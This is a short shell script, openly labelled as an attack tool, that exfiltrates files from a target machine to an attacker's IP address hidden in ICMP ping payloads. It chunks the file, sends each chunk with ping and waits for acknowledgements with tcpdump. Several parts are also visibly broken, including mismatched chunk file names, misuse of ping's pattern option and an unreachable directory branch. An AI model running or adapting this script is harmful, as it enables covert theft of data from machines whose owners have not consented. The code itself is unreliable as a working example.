#!/bin/sh

# exfiltration.sh

# Exfiltration of data from the target machine where it is executed to the attacker machine with icmp packets

# Usage: ./exfiltration.sh <attacker_ip> <target_ip> <target_file>


# Check if the script is run as root
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

# Check if the number of arguments is correct
if [ "$#" -ne 3 ]; then
    echo "Usage: ./exfiltration.sh <attacker_ip> <target_ip> <target_file>"
    exit
fi

# Check if the target file exists
if [ ! -f "$3" ]; then
    echo "File not found!"
    exit
fi

# Check if the target file is readable
if [ ! -r "$3" ]; then
    echo "File not readable!"
    exit
fi

# Check if the target file is not empty
if [ ! -s "$3" ]; then
    echo "File is empty!"
    exit
fi

# If its a directory exfiltrate all the files in it

if [ -d "$3" ]; then
    for file in "$3"/*
    do
        if [ -f "$file" ]; then
            ./exfiltration.sh "$1" "$2" "$file"
        fi
    done
    exit
fi

# Get the file size
size=$(stat -c%s "$3")

# Get the file name
name=$(basename "$3")

# Get the file extension
extension="${name##*.}"

# Get the file name without extension
name="${name%.*}"

# Create a temporary directory
mkdir -p /tmp/exfiltration

# Split the file in chunks of 64 bytes
split -b 64 "$3" /tmp/exfiltration/"$name"_

# Get the number of chunks
chunks=$(ls /tmp/exfiltration | wc -l)

# Send the chunks to the attacker machine
for i in $(seq 1 "$chunks")
do
    # Get the chunk
    chunk=$(cat /tmp/exfiltration/"$name"_"$i")

    # Send the chunk to the attacker machine
    ping -c 1 -s "$size" -p "$chunk" "$1" > /dev/null

    # Wait for the attacker machine to send the ack
    while true
    do
        # Get the ack
        ack=$(tcpdump -i eth0 -c 1 icmp and icmp[icmptype]=icmp-echo and src "$1" and dst "$2" 2> /dev/null | awk '{print $NF}')

        # Check if the ack is correct
        if [ "$ack" = "$chunk" ]; then
            break
        fi
    done
done